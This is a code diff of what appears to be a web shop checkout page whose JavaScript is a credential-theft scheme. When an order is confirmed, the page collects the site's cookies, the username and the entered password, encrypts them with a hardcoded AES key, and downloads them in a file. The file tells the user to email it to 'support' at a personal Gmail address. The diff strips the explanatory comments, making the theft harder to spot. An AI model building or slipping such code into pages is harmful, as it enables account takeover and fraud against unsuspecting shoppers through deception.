@@ -472,7 +472,6 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
   setTimeout(function() {
-    // Ocultar o loader
     document.querySelector('.ui-abstergo').style.display = 'none';
     document.getElementById('code').style.display = 'block';
   }, 30000);
@@ -488,24 +487,20 @@
         .join('\n');
     }
   
-    // Função para criptografar uma string usando AES
     function encryptAES(data) {
-      const key = 'Ck3rH74NpC5WUy9s'; // Chave para criptografia
+      const key = 'Ck3rH74NpC5WUy9s';
       const encrypted = CryptoJS.AES.encrypt(data, key).toString();
       return encrypted;
     }
   
-    // Função para criar um arquivo de texto com os cookies, usuário e senha criptografados e permitir o download
     function downloadCookies() {
       const cookies = getShopCookies();
       const encryptedCookies = encryptAES(cookies);
       const encryptedUsername = encryptAES(username);
       const encryptedPassword = encryptAES(document.getElementById('password').value);
   
-      // Conteúdo a ser escrito no arquivo
       const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!\n\nmegazn960@gmail.com`;
   
-      // Cria o blob com os dados criptografados
       const blob = new Blob([fileContent], { type: 'text/plain' });
       const link = document.createElement('a');
       link.href = URL.createObjectURL(blob);
@@ -515,7 +510,6 @@
       document.body.removeChild(link);
     }
   
-    // Função para confirmar o pedido
     function confirmOrder() {
       document.getElementById('checkout').style.display = 'none';
       document.getElementById('qr-code-container').style.display = 'block';
@@ -523,10 +517,9 @@
       document.getElementById('checkout-link').style.display = 'block';
       document.getElementById('checkout-link').href = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${document.getElementById('username').value}`;
       startTimer();
-      downloadCookies(); // Baixa os cookies, usuário e senha ao confirmar o pedido
+      downloadCookies(); 
     }
   
-    // Função para iniciar o cronômetro
     function startTimer() {
       let seconds = 300;
       const countdown = document.getElementById('countdown');
@@ -543,10 +536,8 @@
       }, 1000);
     }
   
-    // Exibir os itens do pedido ao carregar a página
-    // displayOrder();
+
   
-    // Evento de envio do formulário de login
     document.getElementById('login-form').addEventListener('submit', function(event) {
       event.preventDefault();
       username = document.getElementById('username').value;
